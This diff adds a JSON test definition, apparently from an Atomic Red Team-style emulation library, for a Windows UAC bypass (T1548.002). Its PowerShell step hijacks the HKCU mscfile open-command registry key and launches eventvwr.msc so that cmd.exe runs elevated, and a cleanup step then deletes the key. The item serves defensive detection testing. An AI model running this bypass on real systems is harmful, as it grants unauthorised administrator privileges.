@@ -1,0 +1,52 @@
+{
+  "id": "a6ce9acf-842a-4af6-8f79-539be7608e2b",
+  "name": "Bypass UAC using Event Viewer (PowerShell)",
+  "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "89591edc-dd7d-417b-bd60-19c1b7efc8ef",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0f72784d-a9bf-4a0d-b56e-543d111ae4cd",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "89591edc-dd7d-417b-bd60-19c1b7efc8ef",
+      "p": "on-success",
+      "o": "0f72784d-a9bf-4a0d-b56e-543d111ae4cd"
+    },
+    {
+      "s": "89591edc-dd7d-417b-bd60-19c1b7efc8ef",
+      "p": "on-failure",
+      "o": "0f72784d-a9bf-4a0d-b56e-543d111ae4cd"
+    }
+  ],
+  "tags": [
+    "T1548.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "executable_binary",
+      "type": "path",
+      "description": "Binary to execute with UAC Bypass",
+      "value": "C:\\Windows\\System32\\cmd.exe"
+    }
+  ]
+}
